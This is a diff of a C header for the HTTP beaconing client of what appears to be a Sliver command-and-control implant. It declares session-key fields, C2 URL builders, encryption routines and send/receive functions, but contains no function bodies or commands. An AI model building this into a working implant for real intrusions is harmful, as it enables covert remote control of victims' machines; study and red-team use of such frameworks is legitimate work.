@@ -109,15 +109,15 @@ typedef struct _HTTP_REQUEST {
 	DWORD dwSendTimeout;
 	DWORD dwReceiveTimeout;
 	LPSTR Headers[HeaderEnumEnd];
-} HTTP_REQUEST, *PHTTP_REQUEST;
+} HTTP_REQUEST, * PHTTP_REQUEST;
 
 typedef struct _HTTP_SESSION {
 	HINTERNET hSession;
 	BOOL ProxyAutoConfig;
 	LPSTR lpProxyAutoConfigUrl;
-} HTTP_SESSION, *PHTTP_SESSION;
+} HTTP_SESSION, * PHTTP_SESSION;
 
-typedef struct _HTTP_CONFIG {
+struct _HTTP_CONFIG {
 	PWEB_PROXY pProxyConfig;
 	LPSTR lpUserAgent;
 	BOOL DisableUpgradeHeader;
@@ -128,7 +128,7 @@ typedef struct _HTTP_CONFIG {
 	DWORD dwReceiveTimeout;
 	DWORD dwNumberOfAttemps;
 	LPSTR AdditionalHeaders[HeaderEnumEnd];
-} HTTP_CONFIG, *PHTTP_CONFIG;
+};
 
 typedef struct _HTTP_CLIENT {
 	PURI pUri;
@@ -136,18 +136,9 @@ typedef struct _HTTP_CLIENT {
 	HINTERNET hConnection;
 } HTTP_CLIENT, * PHTTP_CLIENT;
 
-typedef struct _SLIVER_HTTP_CLIENT {
+struct _SLIVER_HTTP_CLIENT {
 	HTTP_CONFIG HttpConfig;
 	PHTTP_CLIENT pHttpClient;
-	CHAR szSessionID[33];
-	CHAR szSliverName[32];
-	CHAR szConfigID[32];
-	UINT64 uPeerID;
-	PBYTE pSessionKey;
-	LPSTR lpRecipientPubKey;
-	LPSTR lpPeerPubKey;
-	LPSTR lpPeerPrivKey;
-	DWORD cbSessionKey;
 	LPSTR lpHostName;
 	DWORD dwPort;
 	BOOL UseStandardPort;
@@ -166,17 +157,14 @@ typedef struct _SLIVER_HTTP_CLIENT {
 	LPSTR lpPathPrefix;
 	DWORD dwMinNumOfSegments;
 	DWORD dwMaxNumOfSegments;
-	UINT64 uReconnectInterval;
 	UINT64 uEncoderNonce;
 	DWORD dwNetTimeout;
 	DWORD dwTlsTimeout;
 	DWORD dwPollTimeout;
 	DWORD dwPollInterval;
 	DWORD dwMaxErrors;
-	LPSTR lpServerMinisignPublicKey;
-	BOOL IsClosed;
 	LPSTR lpCookiePrefix;
-} SLIVER_HTTP_CLIENT, *PSLIVER_HTTP_CLIENT;
+};
 
 typedef enum {
 	PollType,
@@ -189,13 +177,13 @@ typedef struct _HTTP_RESP {
 	DWORD cbResp;
 	DWORD dwStatusCode;
 	HINTERNET hRequest;
-} HTTP_RESP, *PHTTP_RESP;
+} HTTP_RESP, * PHTTP_RESP;
 
 typedef struct _MINISIGN_PUB_KEY {
 	UINT16 SignatureAlgorithm;
 	BYTE KeyId[8];
 	BYTE PublicKey[32];
-} MINISIGN_PUB_KEY, *PMINISIGN_PUB_KEY;
+} MINISIGN_PUB_KEY, * PMINISIGN_PUB_KEY;
 
 PHTTP_CLIENT HttpClientInit
 (
@@ -267,12 +255,6 @@ VOID FreeHttpResp
 	_In_ PHTTP_RESP pResp
 );
 
-PBYTE SliverBase64Decode
-(
-	_In_ LPSTR lpInput,
-	_Out_ PDWORD pcbOutput
-);
-
 LPSTR SliverBase64Encode
 (
 	_In_ PBYTE lpInput,
@@ -290,14 +272,6 @@ PBYTE SessionEncrypt
 	_In_ PBYTE pMessage,
 	_In_ DWORD cbMessage,
 	_Out_ PDWORD pcbCipherText
-);
-
-PBYTE SessionDecrypt
-(
-	_In_ PSLIVER_HTTP_CLIENT pClient,
-	_In_ PBYTE pMessage,
-	_In_ DWORD cbMessage,
-	_Out_ PDWORD pcbPlainText
 );
 
 BOOL VerifySign
@@ -331,10 +305,7 @@ LPSTR StartSessionURL
 	_In_ PSLIVER_HTTP_CLIENT pClient
 );
 
-PSLIVER_HTTP_CLIENT SliverHttpClientInit
-(
-	_In_ LPSTR lpC2Url
-);
+PSLIVER_HTTP_CLIENT SliverHttpInit();
 
 LPSTR ParseSegmentsUrl
 (
@@ -350,4 +321,19 @@ LPSTR CreatePollURL
 LPSTR CreateSessionURL
 (
 	_In_ PSLIVER_HTTP_CLIENT pClient
+);
+
+PSLIVER_HTTP_CLIENT HttpInit();
+
+PENVELOPE HttpRecv
+(
+	_In_ PGLOBAL_CONFIG pConfig,
+	_In_ PSLIVER_HTTP_CLIENT pHttpClient
+);
+
+BOOL HttpSend
+(
+	_In_ PGLOBAL_CONFIG pConfig,
+	_In_ PSLIVER_HTTP_CLIENT pHttpClient,
+	_In_ PENVELOPE pEnvelope
 );
